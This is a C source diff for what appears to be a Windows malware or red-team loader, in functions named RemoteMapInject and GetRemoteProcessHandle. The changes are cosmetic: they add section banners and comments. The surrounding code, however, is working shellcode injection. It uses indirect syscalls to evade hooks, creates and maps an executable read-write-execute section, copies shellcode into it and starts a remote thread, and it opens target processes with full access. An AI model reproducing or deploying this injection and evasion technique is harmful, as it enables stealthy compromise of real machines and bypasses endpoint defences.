@@ -76,6 +76,8 @@ BOOL RemoteMapInject
 		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
 	}
 
+	/*------------------------------------------------------------------------[Create Section]-----------------------------------------------------------------------------*/
+
 	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateSection
 	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))SyscallInvoker)
 		(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
@@ -88,6 +90,8 @@ BOOL RemoteMapInject
 	INFO("[0x%p] NtCreateSection Handle", hSection);
 	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);
 
+	/*------------------------------------------------------------------------[Map Section]------------------------------------------------------------------------------------*/
+
 	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
 	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
 		(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
@@ -99,6 +103,8 @@ BOOL RemoteMapInject
 
 	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
 	INFO("Current Protection--[RWX]  Current Size Allocated--[%zu--Bytes]", sShellSize);
+
+	/*-----------------------------------------------------------------------[Map Section 2]--------------------------------------------------------------------------------------*/
 
 	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
 	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
@@ -114,6 +120,8 @@ BOOL RemoteMapInject
 	memcpy(localaddress, sShellcode, sShellSize);
 
 	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);
+
+	/*---------------------------------------------------------------------------[Create Thread]----------------------------------------------------------------------------------*/
 
 	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtCreateThreadEx
 	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
@@ -192,10 +200,7 @@ BOOL GetRemoteProcessHandle
 		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
 	}
 
-	/*IDSC(ntdll, "NtQuerySystemInformation", &fn_NtQuerySystemInformationSSN, &fn_NtQuerySystemInformationSyscall);
-	IDSC(ntdll, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);*/
-
-	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction);
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
 	((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
 	(SystemProcessInformation, NULL, 0, &uReturnLen1);
 
@@ -210,7 +215,7 @@ BOOL GetRemoteProcessHandle
 
 	pValueToFree = SystemProcInfo;
 
-	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction);
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
 	STATUS = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
 		(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
 	if (STATUS != STATUS_SUCCESS)
@@ -232,7 +237,7 @@ BOOL GetRemoteProcessHandle
 			CID.UniqueProcess = (HANDLE)foundPid;
 			CID.UniqueThread = NULL;
 
-			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction);
+			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtOpenProcess
 			STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
 				(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
 			if (STATUS != STATUS_SUCCESS)
